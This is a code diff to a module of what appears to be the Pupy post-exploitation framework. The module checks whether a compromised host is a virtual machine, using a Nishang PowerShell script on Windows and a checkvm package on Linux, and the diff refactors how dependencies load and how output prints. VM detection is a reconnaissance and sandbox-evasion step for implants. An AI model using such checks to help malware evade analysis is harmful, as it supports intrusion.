@@ -1,7 +1,6 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 from pupylib.PupyModule import *
 import os
-from modules.lib.windows.powershell_upload import execute_powershell_script
 
 __class_name__="CheckVM"
 ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),".."))
@@ -9,21 +8,29 @@ ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),".."))
 @config(category="gather")
 class CheckVM(PupyModule):
     """ check if running on Virtual Machine """
-    
+
+    dependencies = {
+        'linux': [ 'checkvm' ],
+        'windows': [ 'powershell' ]
+    }
+
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog="CheckVM", description=self.__doc__)
 
     def run(self, args):
         if self.client.is_windows():
-            content = open(os.path.join(ROOT, "external", "Nishang", "Check-VM.ps1"), 'r').read()
-            function = 'Check-VM'
-            output = execute_powershell_script(self, content, function)
+            powershell = self.client.conn.modules['powershell']
+            with open(os.path.join(ROOT, 'external', 'Nishang', 'Check-VM.ps1'))  as content:
+                output, rest = powershell.call('checkvm', 'Check-VM', content=content.read())
+
+            if rest:
+                self.error(rest)
+
             if output.strip():
-                self.success("%s" % output)
-            else:
-                self.success("No virtual machine detected")
+                for line in output.split('\n'):
+                    self.success(line)
+
         elif self.client.is_linux():
-            self.client.load_package("checkvm")
             vm = self.client.conn.modules["checkvm"].checkvm()
             if vm:
                 self.success('This appears to be a %s virtual machine' % vm)
@@ -37,4 +44,3 @@ class CheckVM(PupyModule):
                 self.success('This appears to be a %s virtual machine' % vm)
             else:
                 self.success('This does not appear to be a virtual machine')
-
